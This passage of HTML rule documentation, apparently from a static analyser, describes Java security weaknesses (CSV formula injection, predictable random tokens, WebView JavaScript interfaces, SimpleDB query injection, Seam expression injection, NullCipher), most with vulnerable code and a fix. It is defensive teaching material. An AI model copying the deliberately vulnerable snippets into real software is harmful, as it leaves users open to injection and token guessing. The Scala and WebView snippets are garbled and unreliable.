</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-owasp">
<p>https://www.owasp.org/index.php/Resource_Injection <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-capec">
<p>https://capec.mitre.org/data/definitions/240.html <a class="footnote-backref" href="#fnref-capec" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1085">Formula Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Formula Injection, also known as CSV Injection, occurs when websites embed untrusted input inside CSV files.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>When a spreadsheet program such as Microsoft Excel or LibreOffice Calc is used to open a CSV, any cells starting with '=' will be interpreted by the software as a formula. Maliciously crafted formulas can be used for three key attacks:</p>
<ul>
<li>
<p>Hijacking the user's computer by exploiting vulnerabilities in the spreadsheet software, such as CVE-2014-3524</p>
</li>
<li>
<p>Hijacking the user's computer by exploiting the user's tendency to ignore security warnings in spreadsheets that they downloaded from their own website</p>
</li>
<li>
<p>Exfiltrating contents from the spreadsheet, or other open spreadsheets.</p>
</li>
</ul>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>This attack is difficult to mitigate, and explicitly disallowed from quite a few bug bounty programs. To remediate it, ensure that no cells begin with any of the following characters:</p>
<ul>
<li>Equals to ("=")</li>
<li>Plus ("+")</li>
<li>Minus ("-")</li>
<li>At ("@")</li>
</ul>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-owasp">
<p>https://www.owasp.org/index.php/CSV_Injection <a class="footnote-backref" href="#fnref-owasp" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7479">Predictable pseudorandom number generator (Scala)</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Predictable pseudorandom number generator (Scala)</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>The use of a predictable random value can lead to vulnerabilities when used in certain security critical contexts. For example, when the value is used as:</p>
<ul>
<li>a CSRF token: a predictable token can lead to a CSRF attack as an attacker will know the value of the token</li>
<li>a password reset token (sent by email): a predictable password token can lead to an account takeover, since an attacker will guess the URL of the change password form</li>
<li>any other secret value</li>
</ul>
<p>
A quick fix could be to replace the use of <b>java.util.Random</b> with something stronger, such as <b>java.security.SecureRandom</b>.
</p>
<p>
<b>Vulnerable Code:</b><br/>
<pre>import scala.util.Random</pre></p>
<p>def generateSecretToken() {
    val result = Seq.fill(16)(Random.nextInt)
    return result.map("%02x" format _).mkString
}</p></p>

<p>
<b>Solution:</b>
<pre>import java.security.SecureRandom</pre></p>
<p>def generateSecretToken() {
    val rand = new SecureRandom()
    val value = Array.ofDim<a href="16">Byte</a>
    rand.nextBytes(value)
    return value.map("%02x" format <em>).mkString
}</em></p>

<p>
<b>Solution:</b>
<pre>import java.security.SecureRandom
import scala.util.Random.</pre></p>
<p>def generateSecretToken() {
    val secRandom = javaRandomToRandom(new SecureRandom())
    val result = Seq.fill(16)(secRandom.nextInt)
    return result.map("%02x" format _).mkString
}</p>

<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
<h1 id="references">References</h1>
<p><a href="http://jazzy.id.au/default/2010/09/20/cracking_random_number_generators_part_1.html">Cracking Random Number Generators - Part 1 (http://jazzy.id.au)</a><br/>
<a href="https://www.securecoding.cert.org/confluence/display/java/MSC02-J.+Generate+strong+random+numbers">CERT: MSC02-J. Generate strong random numbers</a><br/>
<a href="http://cwe.mitre.org/data/definitions/330.html">CWE-330: Use of Insufficiently Random Values</a><br/>
<a href="http://blog.h3xstream.com/2014/12/predicting-struts-csrf-token-cve-2014.html">Predicting Struts CSRF Token (Example of real-life vulnerability and exploitation)</a>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7580">WebView with JavaScript interface (Android)</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>WebView with JavaScript interface (Android)</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
    The use of JavaScript Interface could expose the WebView to risky API. If an XSS is triggered in the WebView, the class
    could be called by the malicious JavaScript code.
</p></p>
<p>
<b>Code at risk:</b><br/>
<pre><code>WebView myWebView = (WebView) findViewById(R.id.webView);
myWebView.addJavascriptInterface(new FileWriteUtil(this), "fileWriteUtil");
WebSettings webSettings = myWebView.getSettings();
webSettings.setJavaScriptEnabled(true);
[...]
class FileWriteUtil {
    Context mContext;
    FileOpenUtil(Context c) {
        mContext = c;
    }
    public void writeToFile(String data, String filename, String tag) {
        [...]
    }
}
</code></pre>
</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>medium</p>
<h1 id="references">References</h1>
<p><a href="http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface%28java.lang.Object,%20java.lang.String%29">Android Official Doc: WebView.addJavascriptInterface()</a><br/>
<a href="https://cwe.mitre.org/data/definitions/749.html">CWE-749: Exposed Dangerous Method or Function</a></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7473">AWS Query Injection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>AWS Query Injection</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
Constructing SimpleDB queries containing user input can allow an attacker to view unauthorized records.<br/>
The following example dynamically constructs and executes a SimpleDB select() query allowing the user to specify the productCategory. The attacker can modify the query, bypass the required authentication for customerID and view records matching any customer.
</p>
<p>
<b>Vulnerable Code:</b><br/>
<pre>...
String customerID = getAuthenticatedCustomerID(customerName, customerCredentials);
String productCategory = request.getParameter("productCategory");
...
AmazonSimpleDBClient sdbc = new AmazonSimpleDBClient(appAWSCredentials);
String query = "select * from invoices where productCategory = '"
            + productCategory + "' and customerID = '"
            + customerID + "' order by '"
            + sortColumn + "' asc";
SelectResult sdbResult = sdbc.select(new SelectRequest(query));
</pre>
</p>
<p>
<b>Solution:</b><br/>
This issue is analogical to SQL Injection. Sanitize user input before using it in a SimpleDB query.
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>medium</p>
<h1 id="references">References</h1>
<p><a href="https://cwe.mitre.org/data/definitions/943.html">CWE-943: Improper Neutralization of Special Elements in Data Query Logic</a><br/></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7570">Potential code injection in Seam logging call</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Potential code injection in Seam logging call</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
    Seam Logging API support an expression language to introduce bean property to log messages. The expression language can
    also be the source to unwanted code execution.
</p>
<p>
    In this context, an expression is built with a dynamic value. The source of the value(s) should be verified to avoid
    that unfiltered values fall into this risky code evaluation.
</p>
<p><b>Code at risk:</b></p>
<p>
<pre>public void logUser(User user) {
    log.info("Current logged in user : " + user.getUsername());
    //...
}</pre>
</p>
<p><b>Solution:</b></p>
<p>
<pre>public void logUser(User user) {
    log.info("Current logged in user : #0", user.getUsername());
    //...
}</pre>
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>medium</p>
<h1 id="references">References</h1>
<p><a href="https://issues.jboss.org/browse/JBSEAM-5130">JBSEAM-5130: Issue documenting the risk</a><br/>
<a href="https://docs.jboss.org/seam/2.3.1.Final/reference/html_single/#d0e4185">JBoss Seam: Logging (Official documentation)</a><br/>
<a href="https://docs.oracle.com/javaee/6/tutorial/doc/gjddd.html">The Java EE 6 Tutorial: Expression Language</a><br/>
<a href="http://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a><br/>
<a href="http://cwe.mitre.org/data/definitions/95.html">CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')</a><br/></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7538">NullCipher is insecure</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#reference">Reference</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>NullCipher is insecure</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
The NullCipher is rarely used intentionally in production applications. It implements the Cipher interface by returning ciphertext 
identical to the supplied plaintext. In a few contexts, such as testing, a NullCipher may be appropriate.
</p>
<p>
<b>Vulnerable Code:</b><br/>
<pre>Cipher doNothingCihper = new NullCipher();
[...]
//The ciphertext produced will be identical to the plaintext.
byte[] cipherText = c.doFinal(plainText);</pre>
</p>
<p>
<b>Solution:</b><br/>
    Avoid using the NullCipher. Its accidental use can introduce a significant confidentiality risk.
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>critical</p>
<h1 id="reference">Reference</h1>
<p><a href="http://cwe.mitre.org/data/definitions/327.html">CWE-327: Use of a Broken or Risky Cryptographic Algorithm</a>
</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

    <footer>
 <p>
  &copy; Pinpoint 2016-Present, Rights reserve
</p>

<p>
</p>     </footer>
</main>

  <script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " Pinpoint Document ",
  "url" : "../..",
  "image": "",
  "description": "Manual and documents for Sourcebrella Pinpoint"
}
</script> 
<div id="initDiv"
     style="position: fixed; z-index: 1000; background-color: white; top: 0; right: 0; bottom: 0; left: 0; "></div>
<script type="text/javascript">
    window.onload = function () {
        document.getElementsByTagName('body')[0].style.display = "block";
        document.getElementById('initDiv').style.display = 'none';

        document.querySelectorAll('.global_lang li a').forEach(elm => {
            elm.addEventListener('click', (e) => {
                var lang = e.target.getAttribute('language-link');
                var abs_url = '/' + lang + '/';
                var reg = /\/(en|zh)\//;
                var newRef;
                var location = window.location;
                if (reg.test(location.href)) {
                    newRef = location.href.replace(reg, abs_url);
                } else {
                    var match = /\/(output|docs)\//.exec(window.location.href);
                    if (match) {
                        newRef = window.location.href.replace(match[0], '/' + match[1] + abs_url)
                    } else {
                        return;
                    }
                }
                window.open(newRef, '_self')
            })
        })
    };

</script>
</body>

</html>